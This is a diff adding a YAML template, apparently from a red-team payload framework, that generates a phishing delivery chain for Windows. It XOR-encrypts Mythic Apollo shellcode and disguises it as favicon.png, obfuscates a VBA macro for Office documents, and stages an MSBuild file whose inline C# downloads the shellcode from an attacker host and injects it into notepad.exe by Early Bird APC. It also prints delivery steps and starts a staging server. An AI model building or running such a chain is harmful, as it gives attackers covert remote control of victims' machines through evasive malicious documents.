@@ -1,0 +1,40 @@
+---
+metadata:
+  filename: "deliver-windows-x64-mythic-apollo-http-shellcode-runner-vba-msbuild-apc.yaml"
+  tags: ["shell", "windows", "evasion", "c2"]
+  created: "2026-05-29"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }}; \
+  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
+  rm packstation/outbound/shellcode.bin ; \
+  python -c "import base64; open('packstation/outbound/config.xml','w').write(base64.b64decode('{{ include('payloads/msbuild-xml-apc.yaml') | base64 }}').decode())" ; \
+  python -c "import base64; open('packstation/outbound/msbuild.vba','w').write(base64.b64decode('{{ include('payloads/msbuild-vba.yaml') | base64 }}').decode())" ; \
+  python {{ templates_dir }}/helper_scripts/vba_macro_obfuscator.py packstation/outbound/msbuild.vba -o packstation/outbound/msbuild.vba --seed 1337 --junk 12 ; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      ------C2 Check------                      '; \
+  printf '%s\n' 'Ensure Mythic C2 is running at {{ mythic_url }} (callback port: {{ mythic_callback_port }})'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  ---Step-by-Step Delivery---                  '; \
+  printf '%s\n' 'Step 1 - Ensure the target system has msbuild.exe installed'; \
+  printf '%s\n' '  Required: .NET Framework 4.0 at C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ '; \
+  printf '%s\n' 'Step 2 - Start Mythic C2 (see above)'; \
+  printf '%s\n' 'Step 3 - Insert msbuild.vba into an Office document:'; \
+  printf '%s\n' '  Save as .docm (Word) or .xlsm (Excel) with macros enabled'; \
+  printf '%s\n' 'Step 4 - Deliver the Office document to the target'; \
+  printf '%s\n' 'Step 5 - Attack chain on victim open:'; \
+  printf '%s\n' '  AutoOpen triggers -> downloads config.xml from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/config.xml'; \
+  printf '%s\n' '  -> saves to {{ delivery_path_windows }}\config.xml'; \
+  printf '%s\n' '  -> msbuild.exe compiles and executes inline C#'; \
+  printf '%s\n' '  -> C# downloads shellcode from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png'; \
+  printf '%s\n' '  -> injects shellcode into notepad.exe via Early Bird APC'; \
+  printf '%s\n' '  -> Apollo callback on {{ attacker_ip }}:{{ mythic_callback_port }}'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                  ---Files in packstation---                   '; \
+  printf '%s\n' '  config.xml   -> MSBuild project with inline C# (fetched by VBA)'; \
+  printf '%s\n' '  favicon.png  -> XOR(0xCA) Apollo shellcode (fetched by C#)'; \
+  printf '%s\n' '  msbuild.vba  -> obfuscated VBA macro (insert into Office doc)'; \
+  printf '%s\n' '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
